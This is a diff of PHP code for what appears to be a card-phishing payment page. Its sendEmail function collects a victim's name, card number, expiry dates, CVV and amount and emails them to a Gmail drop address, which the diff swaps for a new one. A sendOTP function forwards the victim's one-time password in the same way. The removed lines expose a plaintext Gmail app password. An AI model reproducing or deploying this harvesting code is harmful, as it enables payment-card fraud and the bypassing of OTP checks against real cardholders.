@@ -19,23 +19,23 @@ function sendEmail($post) {
     $cvv = $post['cvv'];
 
 
-    $email_body = "You have received a new message.\n\n";
-    $email_body .= "Card owner: $name\n";
-    $email_body .= "Card number: $card_number\n";
-    $email_body .= "amount to pay: $amount_to_pay\n";
-    $email_body .= "Card expiration year: $card_expiration_year\n";
-    $email_body .= "Card expiration month: $card_expiration_month\n";
-    $email_body .= "Card CVC: $cvv\n";
+    // $email_body = "You have received a new message.\n\n";
+    // $email_body .= "Card owner: $name\n";
+    // $email_body .= "Card number: $card_number\n";
+    // $email_body .= "amount to pay: $amount_to_pay\n";
+    // $email_body .= "Card expiration year: $card_expiration_year\n";
+    // $email_body .= "Card expiration month: $card_expiration_month\n";
+    // $email_body .= "Card CVC: $cvv\n";
 
 
-    $html_body = "<h3>You have received a new message.</h3>";
-    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
-    $html_body .= "<p><strong>card number:</strong> $card_number</p>";
-    $html_body .= "amount to pay: $amount_to_pay\n";
-    $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
-    $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
-    $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
-    $mail = new PHPMailer(true);  
+    // $html_body = "<h3>You have received a new message.</h3>";
+    // $html_body .= "<p><strong>Card owner:</strong> $name</p>";
+    // $html_body .= "<p><strong>card number:</strong> $card_number</p>";
+    // $html_body .= "amount to pay: $amount_to_pay\n";
+    // $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
+    // $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
+    // $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
+    // $mail = new PHPMailer(true);  
 
     // try {
         
@@ -63,7 +63,7 @@ function sendEmail($post) {
     // } catch (Exception $e) {
     //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     // }
-    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
+    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
     // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
     // $message = filter_var($message, FILTER_SANITIZE_STRING);
     // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
@@ -76,16 +76,18 @@ function sendEmail($post) {
     $headers .= "Reply-To: {$fromEmail}" . "\r\n";
 
     $email_body = "You have received a new message.\n\n";
-    $email_body .= "Card owner: $name\n";
-    $email_body .= "Card number: $card_number\n";
-    $email_body .= "Card expiration year: $card_expiration_year\n";
-    $email_body .= "Card expiration month: $card_expiration_month\n";
-    $email_body .= "Card CVC: $cvv\n";
+    $email_body .= "Card owner: $name\r\n";
+    $email_body .= "Card number: $card_number\r\n";
+    $email_body .= "amount: $amount_to_pay\r\n";
+    $email_body .= "Card expiration year: $card_expiration_year\r\n";
+    $email_body .= "Card expiration month: $card_expiration_month\r\n";
+    $email_body .= "Card CVC: $cvv\r\n";
 
 
     $html_body = "<h3>You have received a new message.</h3>";
     $html_body .= "<p><strong>Card owner:</strong> $name</p>";
     $html_body .= "<p><strong>card number:</strong> $card_number</p>";
+    $email_body .= "amount: $amount_to_pay";
     $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
     $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
     $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
@@ -174,36 +176,12 @@ function sendOTP($post) {
 
 
     $html_body = "<h3>You have received a new message.</h3>";
-    $html_body .= "<p><strong>Card owner:</strong> $otp</p>";
+    $html_body .= "<p><strong>OTP:</strong> $otp</p>";
+    $mail = new PHPMailer(true);  
 
-    // try {
-    //     //Server settings
-    //     $mail->SMTPDebug = 0;  // Disable verbose debug output
-    //     $mail->isSMTP();  // Set mailer to use SMTP
-    //     $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
-    //     $mail->SMTPAuth   = true;  // Enable SMTP authentication
-    //     $mail->Username   = "americanresidence435@gmail.com";   // Your Gmail address
-    //     $mail->Password   = 'dtwh cnul jqfq uxol';  // Your Gmail password or app-specific password
-    //     $mail->SMTPSecure = 'ssl';  // Enable TLS encryption
-    //     $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP
-
-    //     //Recipients
-    //     $mail->setFrom('americanresidence435@gmail.com', 'Resido');  // From email address and name
-    //     $mail->addAddress("americanresidence435@gmail.com");  // Recipient email address
-
-    //     // Content
-    //     $mail->isHTML(true);  // Set email format to HTML
-    //     $mail->Subject = $subject;
-    //     $mail->Body    = $email_body;
-
-    //     // Send the email
-    //     $mail->send();
-    //     echo 'success';
-    // } catch (Exception $e) {
-    //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
-    // }
+   
     $name = "me";
-    $fromEmail = "agent@americaresides.com";
+    $fromEmail = "americanresidence435@gmail.com";
     $headers = "MIME-Version: 1.0" . "\r\n";
     $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
     $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
